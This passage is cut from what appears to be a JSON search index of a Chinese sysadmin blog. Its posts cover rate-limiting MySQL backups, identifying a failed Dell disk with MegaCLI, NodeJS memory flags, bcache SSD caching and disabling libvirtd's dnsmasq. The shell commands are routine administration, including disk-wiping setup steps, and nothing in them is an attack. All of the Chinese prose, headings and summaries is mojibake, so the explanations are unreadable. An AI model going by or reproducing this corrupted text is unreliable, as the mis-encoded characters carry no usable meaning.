id=\"ä¸€ä¼˜åŒ–ioå’Œcpuè®©å¤‡ä»½å†™ç£ç›˜çš„é€Ÿåº¦é™ä¸‹æ¥å¹³ç¨³çš„å†™å…¥\"\u003eä¸€ã€ä¼˜åŒ–ioå’Œcpuï¼Œè®©å¤‡ä»½å†™ç£ç›˜çš„é€Ÿåº¦é™ä¸‹æ¥ï¼Œå¹³ç¨³çš„å†™å…¥\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enice -n \u003cspan class=\"m\"\u003e10\u003c/span\u003e ionice -c2 -n \u003cspan class=\"m\"\u003e7\u003c/span\u003e /usr/bin/mysqldump -S /var/lib/mysql/mysql.sock -uroot --single-transaction --quick\u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  --triggers -R --hex-blob --log-error\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$db\u003c/span\u003e.log --databases \u003cspan class=\"nv\"\u003e$db\u003c/span\u003e \u0026gt; \u003cspan class=\"nv\"\u003e$basedir\u003c/span\u003e/\u003cspan class=\"nv\"\u003e$backdir\u003c/span\u003e/\u003cspan class=\"nv\"\u003e$db\u003c/span\u003e.sql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"äºŒåŠ å¿«å¤‡ä»½é€Ÿåº¦å¤šçº¿ç¨‹è®©æŠ¥è­¦è§¦å‘ä¹‹å‰å°±ç»“æŸå¤‡ä»½\"\u003eäºŒã€åŠ å¿«å¤‡ä»½é€Ÿåº¦ï¼Œå¤šçº¿ç¨‹ï¼Œè®©æŠ¥è­¦è§¦å‘ä¹‹å‰å°±ç»“æŸå¤‡ä»½\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCOMMIT_COUNT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCOMMIT_LIMIT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e10\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e DB in \u003cspan class=\"sb\"\u003e`\u003c/span\u003ecat ListOfDatabases.txt\u003cspan class=\"sb\"\u003e`\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edo\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    mysqldump -h... -u... -p... --hex-blob --routines --triggers \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDB\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e gzip \u0026gt; \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDB\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e.sql.gz \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e((\u003c/span\u003e COMMIT_COUNT++ \u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCOMMIT_COUNT\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e -eq \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCOMMIT_LIMIT\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eCOMMIT_COUNT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003ewait\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCOMMIT_COUNT\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e -gt \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ethen\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003ewait\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"ä¸‰ç”¨cstreamæ¥æ§åˆ¶æµé€Ÿ\"\u003eä¸‰ã€ç”¨cstreamæ¥æ§åˆ¶æµé€Ÿ\u003c/h4\u003e\n\u003cp\u003e-t = throughput in bytes/sec\n1000000æ˜¯ä¸€å…†ï¼Œæ¯ç§’åªå…è®¸å†™ä¸€å…†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqldump --single-transaction --quick -u \u0026lt;USER\u0026gt; -p\u0026lt;PASS\u0026gt; \u0026lt;Database\u0026gt; \u003cspan class=\"p\"\u003e|\u003c/span\u003e cstream -t \u003cspan class=\"m\"\u003e1000000\u003c/span\u003e \u0026gt; backup.sql  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"å››ç”¨pvæ¥æ§åˆ¶æµé€Ÿ\"\u003eå››ã€ç”¨pvæ¥æ§åˆ¶æµé€Ÿ\u003c/h4\u003e\n\u003cp\u003e\u0026ndash;rate-limit Limit the transfer to a maximum of RATE bytes per second.\nå•ä½å¯ä»¥æ˜¯ï¼š1k 1m 1g 1t\u003c/p\u003e","title":"MySQLçš„å¤‡ä»½ç½‘ç»œä¼˜åŒ–"},{"content":"å…¬å¸çš„Dell R720XDæœåŠ¡å™¨æ˜¯ç”¨æ¥åšHadoopå¤§æ•°æ®çš„ã€‚\nå…¶ä¸­æœ‰ä¸¤å—300Gçš„ç¡¬ç›˜åšRaid1ï¼Œä½œä¸ºç³»ç»Ÿç›˜ã€‚\nå‰©ä¸‹3å—ç¡¬ç›˜æ˜¯4TBï¼Œéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ²¡æœ‰åšä»»ä½•Raidï¼Œå•ç‹¬åšæ•°æ®ç›˜ã€‚\nä½†æ˜¯ï¼Œè¿™ä¸‰å—ç¡¬ç›˜éƒ½è¢« Dell H330 çš„Raidæ§åˆ¶å™¨æ§åˆ¶ï¼Œäºæ˜¯3å—ç¡¬ç›˜å‘¢ï¼Œå…¶å®æ¯ä¸ªéƒ½æ˜¯ä¸ªå•ç‹¬çš„ Raid0\nå»æœºæˆ¿å·¡æ£€çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°ä¸€ä¸ªç¡¬ç›˜äº®é»„ç¯ã€‚\nä»idracå£å¯ä»¥çœ‹åˆ°åäº†ä¸ªç¡¬ç›˜\né—®é¢˜æ¥äº†ï¼Œä¸‰å—å•Šï¼Œåˆ°åº•æ˜¯å“ªå—åäº†å‘¢ï¼Ÿ\næ³¨æ„ä¸Šå›¾ï¼Œä¿®è®¢æ˜¯ï¼šGS0Fï¼Œåºåˆ—å·æ˜¯ï¼šZ1Z83DXH\næˆ‘äº†ä¸ªæ“¦ï¼Œæ‰€æœ‰ç¡¬ç›˜éƒ½è¢«h330æ¥ç®¡ï¼Œæ‰€ä»¥lspciä»€ä¹ˆä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œåªèƒ½çœ‹å‡ºæ˜¯ä¸ªlsiçš„MegaRAIDï¼ï¼ï¼\nlspci|grep Mega 02:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS-3 3008 [Fury] (rev 02) æ²¡åŠæ³•ï¼Œå…ˆå»ä¸‹ä¸ªMegaCLIå§: MegaCli.tgz\ncd /opt/MegaRAID tar zxvf MegaCli.tgz å†ä¸‹ä¸ªpython, mega-status.py\nchmod 755 mega-status.py ./mega-status.py æ³¨æ„è¿™ä¸ªè„šæœ¬æ˜¯å¼•ç”¨äº†64ä½çš„megacli\ndef_megaclipath = \u0026#34;/opt/MegaRAID/MegaCli/MegaCli64\u0026#34; çœ‹è¿è¡Œç»“æœå•Š\nè¿™é‡ŒæŠŠä¿®è®¢å’Œåºåˆ—å·è¿åœ¨ä¸€èµ·äº†ï¼š GS0FZ1Z83DXH å¯¹åº”c0u2p0ï¼Œå¯¹åº”ä¸Šé¢çš„c0u2ï¼Œå¯¹åº”å³è¾¹çš„/dev/sdc\næ‰€ä»¥æ˜¯/dev/sdcåæ‰äº†ã€‚\næå®šã€‚\nè¿™æ ·å°±å¯ä»¥å…ˆå¸è½½/dev/sdcï¼Œç„¶åæ¢ç›˜äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240123-dell_disk/","summary":"\u003cp\u003eå…¬å¸çš„Dell R720XDæœåŠ¡å™¨æ˜¯ç”¨æ¥åšHadoopå¤§æ•°æ®çš„ã€‚\u003c/p\u003e\n\u003cp\u003eå…¶ä¸­æœ‰ä¸¤å—300Gçš„ç¡¬ç›˜åšRaid1ï¼Œä½œä¸ºç³»ç»Ÿç›˜ã€‚\u003c/p\u003e\n\u003cp\u003eå‰©ä¸‹3å—ç¡¬ç›˜æ˜¯4TBï¼Œéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ²¡æœ‰åšä»»ä½•Raidï¼Œå•ç‹¬åšæ•°æ®ç›˜ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œè¿™ä¸‰å—ç¡¬ç›˜éƒ½è¢« Dell H330 çš„Raidæ§åˆ¶å™¨æ§åˆ¶ï¼Œäºæ˜¯3å—ç¡¬ç›˜å‘¢ï¼Œå…¶å®æ¯ä¸ªéƒ½æ˜¯ä¸ªå•ç‹¬çš„ \u003ccode\u003eRaid0\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eå»æœºæˆ¿å·¡æ£€çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°ä¸€ä¸ªç¡¬ç›˜äº®é»„ç¯ã€‚\u003c/p\u003e\n\u003cp\u003eä»idracå£å¯ä»¥çœ‹åˆ°åäº†ä¸ªç¡¬ç›˜\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240123142237915\" loading=\"lazy\" src=\"/posts/20240123-dell_disk/image-20240123142237915.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé—®é¢˜æ¥äº†ï¼Œä¸‰å—å•Šï¼Œåˆ°åº•æ˜¯å“ªå—åäº†å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ä¸Šå›¾ï¼Œä¿®è®¢æ˜¯ï¼šGS0Fï¼Œåºåˆ—å·æ˜¯ï¼šZ1Z83DXH\u003c/p\u003e\n\u003cp\u003eæˆ‘äº†ä¸ªæ“¦ï¼Œæ‰€æœ‰ç¡¬ç›˜éƒ½è¢«h330æ¥ç®¡ï¼Œæ‰€ä»¥lspciä»€ä¹ˆä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œåªèƒ½çœ‹å‡ºæ˜¯ä¸ªlsiçš„MegaRAIDï¼ï¼ï¼\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elspci\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep Mega  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e02:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS-3 \u003cspan class=\"m\"\u003e3008\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eFury\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003erev 02\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ²¡åŠæ³•ï¼Œå…ˆå»ä¸‹ä¸ªMegaCLIå§: \u003ca href=\"MegaCli.tgz\"\u003eMegaCli.tgz\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /opt/MegaRAID\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf MegaCli.tgz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå†ä¸‹ä¸ªpython, \u003ca href=\"mega-status.py\"\u003emega-status.py\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e mega-status.py  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./mega-status.py\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„è¿™ä¸ªè„šæœ¬æ˜¯å¼•ç”¨äº†64ä½çš„megacli\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edef_megaclipath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/opt/MegaRAID/MegaCli/MegaCli64\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹è¿è¡Œç»“æœå•Š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240123142400354\" loading=\"lazy\" src=\"/posts/20240123-dell_disk/image-20240123142400354.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™é‡ŒæŠŠä¿®è®¢å’Œåºåˆ—å·è¿åœ¨ä¸€èµ·äº†ï¼š GS0FZ1Z83DXH å¯¹åº”c0u2p0ï¼Œå¯¹åº”ä¸Šé¢çš„c0u2ï¼Œå¯¹åº”å³è¾¹çš„/dev/sdc\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥æ˜¯/dev/sdcåæ‰äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæå®šã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å°±å¯ä»¥å…ˆå¸è½½/dev/sdcï¼Œç„¶åæ¢ç›˜äº†ã€‚\u003c/p\u003e","title":"Dell R730XDæœåŠ¡å™¨å¦‚ä½•ç¡®å®šæ˜¯å“ªå—ç¡¬ç›˜åäº†"},{"content":"NodeJSé»˜è®¤64ä½æœºå™¨GCæ˜¯æœ‰1.4Gå†…å­˜ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ˜¯512æˆ–è€…128å…†å†…å­˜çš„å°vpsï¼Œç«‹æ—¶å°±ä¸çµäº†ã€‚\néœ€è¦åŠ å‚æ•°\n--max_old_space_size=128 --optimize_for_size ä¸€å¥è¯æå®šã€‚\n","permalink":"https://rendoumi.com/posts/20240123-nodejs_gc/","summary":"\u003cp\u003e\u003ccode\u003eNodeJS\u003c/code\u003eé»˜è®¤64ä½æœºå™¨GCæ˜¯æœ‰1.4Gå†…å­˜ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ˜¯512æˆ–è€…128å…†å†…å­˜çš„å°vpsï¼Œç«‹æ—¶å°±ä¸çµäº†ã€‚\u003c/p\u003e\n\u003cp\u003eéœ€è¦åŠ å‚æ•°\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--max_old_space_size\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e128\u003c/span\u003e --optimize_for_size\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸€å¥è¯æå®šã€‚\u003c/p\u003e","title":"å°å¾®vpsä¸‹è¿è¡Œnodejséœ€è¦æ³¨æ„çš„gc"},{"content":"\nå¦‚ä¸Šå›¾ï¼Œæ•°æ®å†™åˆ°ç¡¬ç›˜æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯Bcacheç”¨SSDåšç¼“å†²ï¼ŒåŠ é€Ÿæœ€åçš„ç¡¬ç›˜è¯»å†™ã€‚å¦ä¸€ç§æ˜¯ç›´æ¥è¯»å†™ç¡¬ç›˜ï¼Œbypassæ¨¡å¼ã€‚æˆ‘ä»¬ç”¨çš„æ˜¯ç¬¬ä¸€ç§Bcacheã€‚\nå®‰è£…ï¼š\n$ yum install bcache-tools /dev/sdaæ˜¯ç¡¬ç›˜ï¼Œ/dev/sdbæ˜¯ssdï¼Œ é¦–å…ˆæŠŠä¸¤ä¸ªç›˜çš„æ•°æ®éƒ½æ“¦å¹²å‡€äº†\n$ wipefs -a /dev/sda1 ; wipefs -a /dev/sdb1 æ ¼å¼åŒ–hddå’Œssdï¼Œæ³¨æ„å‚æ•°ä¸åŒ\n$ make-bcache -B /dev/sda1 ; make-bcache -C /dev/sdb1 æŒ‚æ¥bcache0\n$ echo C_Set_UUID_VALUE \u0026gt; /sys/block/bcache0/bcache/attach $ mkfs.ext4 /dev/bcache0 $ mount /dev/bcache0 /mnt ä¿®æ”¹ç¡¬ç›˜å†™çš„æ–¹æ³•ï¼Œæ”¹æˆwriteback(åŸæ¥æ˜¯writethrough)\n1.ä¸´æ—¶ç”Ÿæ•ˆçš„æ–¹æ³•ï¼ˆé‡å¯å¤±æ•ˆï¼‰ $ echo writeback \u0026gt; /sys/block/bcache0/bcache/cache_mode 2.æ°¸ä¹…ç”Ÿæ•ˆçš„æ–¹æ³• $ echo /dev/sda1 \u0026gt; /sys/fs/bcache/register æœ€åæŸ¥çœ‹ä¸€ä¸‹çŠ¶æ€ï¼š\n$ bcache-status -s ","permalink":"https://rendoumi.com/posts/20240123-ssd_cache/","summary":"\u003cp\u003e\u003cimg alt=\"image-20240123113743682\" loading=\"lazy\" src=\"/posts/20240123-ssd_cache/image-20240123113743682.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¦‚ä¸Šå›¾ï¼Œæ•°æ®å†™åˆ°ç¡¬ç›˜æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯Bcacheç”¨SSDåšç¼“å†²ï¼ŒåŠ é€Ÿæœ€åçš„ç¡¬ç›˜è¯»å†™ã€‚å¦ä¸€ç§æ˜¯ç›´æ¥è¯»å†™ç¡¬ç›˜ï¼Œbypassæ¨¡å¼ã€‚æˆ‘ä»¬ç”¨çš„æ˜¯ç¬¬ä¸€ç§Bcacheã€‚\u003c/p\u003e\n\u003cp\u003eå®‰è£…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ yum install bcache-tools\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e/dev/sdaæ˜¯ç¡¬ç›˜ï¼Œ/dev/sdbæ˜¯ssdï¼Œ  é¦–å…ˆæŠŠä¸¤ä¸ªç›˜çš„æ•°æ®éƒ½æ“¦å¹²å‡€äº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ wipefs -a /dev/sda1 \u003cspan class=\"p\"\u003e;\u003c/span\u003e wipefs -a /dev/sdb1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ ¼å¼åŒ–hddå’Œssdï¼Œæ³¨æ„å‚æ•°ä¸åŒ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ make-bcache -B /dev/sda1 \u003cspan class=\"p\"\u003e;\u003c/span\u003e make-bcache -C /dev/sdb1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæŒ‚æ¥bcache0\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e C_Set_UUID_VALUE \u0026gt; /sys/block/bcache0/bcache/attach\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ mkfs.ext4 /dev/bcache0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ mount /dev/bcache0 /mnt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¿®æ”¹ç¡¬ç›˜å†™çš„æ–¹æ³•ï¼Œæ”¹æˆwriteback(åŸæ¥æ˜¯writethrough)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1.ä¸´æ—¶ç”Ÿæ•ˆçš„æ–¹æ³•ï¼ˆé‡å¯å¤±æ•ˆï¼‰  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e writeback \u0026gt; /sys/block/bcache0/bcache/cache_mode\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2.æ°¸ä¹…ç”Ÿæ•ˆçš„æ–¹æ³•  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e /dev/sda1 \u0026gt; /sys/fs/bcache/register\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ€åæŸ¥çœ‹ä¸€ä¸‹çŠ¶æ€ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ bcache-status -s\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"åœ¨linuxä¸‹ç”¨SSDç›˜æ¥åŠ é€ŸHDDç¡¬ç›˜"},{"content":"æœåŠ¡å™¨è¦è·‘dnsmasqï¼ŒåŒæ—¶æœºå™¨è¿˜è·‘ç€kvmï¼Œå’Œlibvirtdè‡ªå¸¦dnsmasqçš„å†²çªäº†ï¼Œéœ€è¦ç¦æ‰libvirtdçš„ã€‚\næ–¹æ³•å¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š\nvirsh net-list Name State Autostart Persistent -------------------------------------------------- default active yes yes virsh net-autostart --disable default virsh net-destroy default æå®š.\n","permalink":"https://rendoumi.com/posts/20240123-kvm_disable_dnsmasq/","summary":"\u003cp\u003eæœåŠ¡å™¨è¦è·‘dnsmasqï¼ŒåŒæ—¶æœºå™¨è¿˜è·‘ç€kvmï¼Œå’Œlibvirtdè‡ªå¸¦dnsmasqçš„å†²çªäº†ï¼Œéœ€è¦ç¦æ‰libvirtdçš„ã€‚\u003c/p\u003e\n\u003cp\u003eæ–¹æ³•å¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh net-list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName                 State      Autostart     Persistent  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--------------------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefault              active     yes           yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh net-autostart --disable default  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh net-destroy default\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæå®š.\u003c/p\u003e","title":"å¦‚ä½•ç¦æ­¢libvirtdè‡ªå¸¦çš„dnsmasqå¯åŠ¨"},{"content":"å…¬å¸çš„çº¿ä¸Šç¯å¢ƒåˆ†ä¸ºé¢„å‘å¸ƒå’Œæ­£å¼ä¸¤ä¸ªéƒ¨åˆ†ã€‚\nå…¶å®ä¸¤ä¸ªéƒ¨åˆ†æ˜¯å…¬ç”¨ä¸€ä¸ªNginxå‰ç«¯çš„ã€‚\nè¿™æ 